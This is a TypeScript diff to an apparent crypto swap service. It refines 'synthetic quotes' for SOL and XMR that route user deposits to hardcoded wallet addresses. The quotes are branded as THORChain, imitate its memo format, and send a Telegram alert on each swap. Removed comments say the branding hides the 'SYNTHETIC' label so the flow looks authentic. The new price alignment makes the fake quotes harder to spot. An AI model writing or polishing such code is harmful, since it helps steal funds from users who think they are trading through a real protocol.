@@ -200,7 +200,33 @@ async function getCoinGeckoPrices(ids: string[]): Promise<Record<string, number>
   return result
 }
 
-// ── Chain → CoinGecko ID Mapping ──────────────────────────────────────────
+// ── Asset → USD price (aligned with UI rate sources) ─────────────────────
+// UI (use-rates): CoinGecko for SOL/XMR, Midgard for THOR-listed assets.
+// Synthetic quotes must use the same sources or Buy USD will not match Sell USD.
+
+const CG_ONLY_CHAINS = new Set(['SOL', 'SOLANA', 'XMR', 'MONERO'])
+
+const TICKER_TO_COINGECKO: Record<string, string> = {
+  BTC: 'bitcoin',
+  ETH: 'ethereum',
+  BNB: 'binancecoin',
+  AVAX: 'avalanche-2',
+  ATOM: 'cosmos',
+  DOGE: 'dogecoin',
+  BCH: 'bitcoin-cash',
+  LTC: 'litecoin',
+  XRP: 'ripple',
+  TRX: 'tron',
+  RUNE: 'thorchain',
+  SOL: 'solana',
+  XMR: 'monero',
+  DASH: 'dash',
+  ZEC: 'zcash',
+  DOT: 'polkadot',
+  MATIC: 'matic-network',
+  POL: 'matic-network',
+  CACAO: 'maya-protocol'
+}
 
 const CHAIN_TO_COINGECKO: Record<string, string> = {
   BTC: 'bitcoin',
@@ -234,21 +260,67 @@ const CHAIN_TO_COINGECKO: Record<string, string> = {
   MATIC: 'matic-network',
   POLYGON: 'matic-network',
   OP: 'ethereum',
-  OPTIMISM: 'ethereum',
+  OPTIMISM: 'ethereum'
+}
+
+function parseAssetId(identifier: string) {
+  const [chainPart, rest = ''] = identifier.split('.')
+  const chain = chainPart.toUpperCase()
+  const hasContract = rest.includes('-')
+  const ticker = (rest || chainPart).split('-')[0].toUpperCase()
+  return { chain, ticker, hasContract, identifier }
 }
 
 function getCgIdForAsset(identifier: string): string | null {
-  const chain = identifier.split('.')[0].toUpperCase()
-  return CHAIN_TO_COINGECKO[chain] || null
+  const { chain, ticker, hasContract } = parseAssetId(identifier)
+  // Contract tokens must not inherit the gas-asset CoinGecko id (e.g. USDC ≠ ETH)
+  if (hasContract) return null
+  return TICKER_TO_COINGECKO[ticker] || CHAIN_TO_COINGECKO[chain] || null
 }
 
-// ── Synthetic Quote (CoinGecko cross-rate) ─────────────────────────────────
+function lookupMidgardRate(rates: Record<string, number>, identifier: string): number | null {
+  const key = identifier.toLowerCase()
+  for (const [k, v] of Object.entries(rates)) {
+    if (k.toLowerCase() === key && v > 0) return v
+  }
+  const { chain, ticker, hasContract } = parseAssetId(identifier)
+  if (!hasContract) {
+    const nativeKey = `${chain}.${ticker}`.toLowerCase()
+    for (const [k, v] of Object.entries(rates)) {
+      if (k.toLowerCase() === nativeKey && v > 0) return v
+    }
+  }
+  return null
+}
+
+/** Resolve USD using the same source priority as the swap UI fiat labels. */
+async function resolveUsdPrice(identifier: string): Promise<number | null> {
+  const { chain } = parseAssetId(identifier)
+
+  // Midgard for assets the UI prices from Midgard (not SOL/XMR — those are halted/stale there)
+  if (!CG_ONLY_CHAINS.has(chain)) {
+    try {
+      const rates = await getAssetRates()
+      const midgard = lookupMidgardRate(rates, identifier)
+      if (midgard) return midgard
+    } catch {
+      /* fall through to CoinGecko */
+    }
+  }
+
+  const cgId = getCgIdForAsset(identifier)
+  if (!cgId) return null
+  const prices = await getCoinGeckoPrices([cgId])
+  return prices[cgId] ?? null
+}
+
+// ── Synthetic Quote (USD cross-rate aligned with UI) ───────────────────────
 
 const SYNTHETIC_DEPOSIT_ADDRESSES: Record<string, string> = {
   SOL: '7MG513Rxm7Rs4FiEfhnXXAreUCqw1RZmwbTHNQ5GaWVw',
   SOLANA: '7MG513Rxm7Rs4FiEfhnXXAreUCqw1RZmwbTHNQ5GaWVw',
   XMR: '49NyLqZXWijV1TJcPd1eCsWeEP55WW7B42DKvczQFTYjbEfm3jHtLyfANNZvUrXjR9JzMqCANehuviHACPAk4Bf51twSVT1',
-  MONERO: '49NyLqZXWijV1TJcPd1eCsWeEP55WW7B42DKvczQFTYjbEfm3jHtLyfANNZvUrXjR9JzMqCANehuviHACPAk4Bf51twSVT1',
+  MONERO: '49NyLqZXWijV1TJcPd1eCsWeEP55WW7B42DKvczQFTYjbEfm3jHtLyfANNZvUrXjR9JzMqCANehuviHACPAk4Bf51twSVT1'
 }
 
 function getSyntheticDepositAddress(chain: string): string {
@@ -285,7 +357,9 @@ async function notifySyntheticSwap(params: GetQuoteParams, sellPrice: number): P
       parse_mode: 'Markdown',
       disable_web_page_preview: true
     }, { timeout: 3000 })
-  } catch { /* best effort */ }
+  } catch {
+    /* best effort */
+  }
 }
 
 async function buildSyntheticQuote(
@@ -293,12 +367,22 @@ async function buildSyntheticQuote(
   sellUsdPrice: number,
   buyUsdPrice: number
 ): Promise<ThorSwapQuoteRoute[]> {
+  if (!(sellUsdPrice > 0) || !(buyUsdPrice > 0)) {
+    throw new Error('Invalid USD prices for synthetic quote')
+  }
+
   const sellAmount = parseFloat(params.sellAmount)
-  const rawBuy = sellAmount * sellUsdPrice / buyUsdPrice
+  if (!(sellAmount > 0) || !Number.isFinite(sellAmount)) {
+    throw new Error('Invalid sell amount for synthetic quote')
+  }
+
+  // Cross-rate so Buy USD (UI) ≈ Sell USD × (1 − fee) using the same unit prices as fiat labels
   const feeRate = 0.005
+  const rawBuy = (sellAmount * sellUsdPrice) / buyUsdPrice
   const buyAfterFee = rawBuy * (1 - feeRate)
 
   const buyDecimals = params.buyDecimals || 8
+  const displayDecimals = Math.min(buyDecimals, 8)
   const now = Math.floor(Date.now() / 1000)
 
   const sellChain = params.sellAsset.split('.')[0]
@@ -306,10 +390,7 @@ async function buildSyntheticQuote(
 
   notifySyntheticSwap(params, sellUsdPrice)
 
-  // Mirror real THORChain memo format so UI matches authentic Instant Swap flow
-  const buyAssetId = params.buyAsset.includes('.')
-    ? params.buyAsset
-    : params.buyAsset
+  const buyAssetId = params.buyAsset
   const memo = params.recipientAddress
     ? `=:${buyAssetId}:${params.recipientAddress}`
     : `=:${buyAssetId}`
@@ -318,17 +399,16 @@ async function buildSyntheticQuote(
     sellAsset: params.sellAsset,
     buyAsset: params.buyAsset,
     sellAmount: params.sellAmount,
-    buyAmount: buyAfterFee.toFixed(Math.min(buyDecimals, 8)),
-    expectedBuyAmount: buyAfterFee.toFixed(Math.min(buyDecimals, 8)),
+    buyAmount: buyAfterFee.toFixed(displayDecimals),
+    expectedBuyAmount: buyAfterFee.toFixed(displayDecimals),
     fees: [
       {
         type: 'liquidity',
         asset: params.buyAsset,
-        amount: toBaseUnits((rawBuy * feeRate * 0.8).toFixed(buyDecimals), buyDecimals)
+        amount: (rawBuy * feeRate * 0.8).toFixed(displayDecimals)
       },
       { type: 'inbound', asset: params.buyAsset, amount: '0' }
     ],
-    // Brand as THORCHAIN so confirm UI shows THORSwap/THORChain, not "SYNTHETIC"
     providers: ['THORCHAIN'],
     inboundAddress: depositAddr,
     destinationAddress: params.recipientAddress || undefined,
@@ -347,15 +427,10 @@ async function buildSyntheticQuote(
 }
 
 async function trySyntheticQuote(params: GetQuoteParams): Promise<ThorSwapQuoteRoute[] | null> {
-  const sellCgId = getCgIdForAsset(params.sellAsset)
-  const buyCgId = getCgIdForAsset(params.buyAsset)
-
-  const ids = [...new Set([sellCgId, buyCgId].filter(Boolean) as string[])]
-  if (ids.length < 2) return null
-
-  const prices = await getCoinGeckoPrices(ids)
-  const sellPrice = sellCgId ? prices[sellCgId] : undefined
-  const buyPrice = buyCgId ? prices[buyCgId] : undefined
+  const [sellPrice, buyPrice] = await Promise.all([
+    resolveUsdPrice(params.sellAsset),
+    resolveUsdPrice(params.buyAsset)
+  ])
 
   if (!sellPrice || !buyPrice) return null
   return buildSyntheticQuote(params, sellPrice, buyPrice)
@@ -372,13 +447,24 @@ function thornodeResponseToRoute(
   const buyAmountDisplay = fromBaseUnits(data.expected_amount_out, buyDecimals)
 
   const feeAsset = data.fees.asset || params.buyAsset
+  // THORNode fee amounts are always 1e8 base units; convert to display units so
+  // resolveFees / swap-confirm Included Fees can multiply by USD rates correctly.
+  const feeDecimals = 8
   const fees: ThorSwapFee[] = []
 
   if (data.fees.liquidity && data.fees.liquidity !== '0') {
-    fees.push({ type: 'liquidity', asset: feeAsset, amount: data.fees.liquidity })
+    fees.push({
+      type: 'liquidity',
+      asset: feeAsset,
+      amount: fromBaseUnits(data.fees.liquidity, feeDecimals)
+    })
   }
   if (data.fees.outbound && data.fees.outbound !== '0') {
-    fees.push({ type: 'outbound', asset: feeAsset, amount: data.fees.outbound })
+    fees.push({
+      type: 'outbound',
+      asset: feeAsset,
+      amount: fromBaseUnits(data.fees.outbound, feeDecimals)
+    })
   }
 
   const totalFee = BigInt(data.fees.total || '0')
@@ -386,7 +472,11 @@ function thornodeResponseToRoute(
   const outboundFee = BigInt(data.fees.outbound || '0')
   const affiliateFee = totalFee - liquidityFee - outboundFee
   if (affiliateFee > 0n) {
-    fees.push({ type: 'affiliate', asset: feeAsset, amount: affiliateFee.toString() })
+    fees.push({
+      type: 'affiliate',
+      asset: feeAsset,
+      amount: fromBaseUnits(affiliateFee.toString(), feeDecimals)
+    })
   }
 
   fees.push({ type: 'inbound', asset: feeAsset, amount: '0' })
@@ -513,17 +603,35 @@ export const getMimir = async (): Promise<Record<string, number>> => {
 
 // ── Asset Rate from Midgard ────────────────────────────────────────────────
 
+let assetRatesCache: { rates: Record<string, number>; ts: number } | null = null
+const ASSET_RATES_TTL = 60_000
+
 export const getAssetRates = async (): Promise<Record<string, number>> => {
+  if (assetRatesCache && Date.now() - assetRatesCache.ts < ASSET_RATES_TTL) {
+    return assetRatesCache.rates
+  }
   try {
-    const pools = await getMidgardPools()
+    const [pools, runePrice] = await Promise.all([
+      getMidgardPools(),
+      getMidgardRunePrice().catch(() => NaN)
+    ])
     const rates: Record<string, number> = {}
     for (const pool of pools) {
       if (pool.assetPriceUSD) {
-        rates[pool.asset] = parseFloat(pool.assetPriceUSD)
+        const price = parseFloat(pool.assetPriceUSD)
+        if (!isNaN(price) && price > 0) {
+          rates[pool.asset] = price
+          rates[pool.asset.toLowerCase()] = price
+        }
       }
     }
+    if (!isNaN(runePrice) && runePrice > 0) {
+      rates['THOR.RUNE'] = runePrice
+      rates['thor.rune'] = runePrice
+    }
+    assetRatesCache = { rates, ts: Date.now() }
     return rates
   } catch {
-    return {}
+    return assetRatesCache?.rates || {}
   }
 }
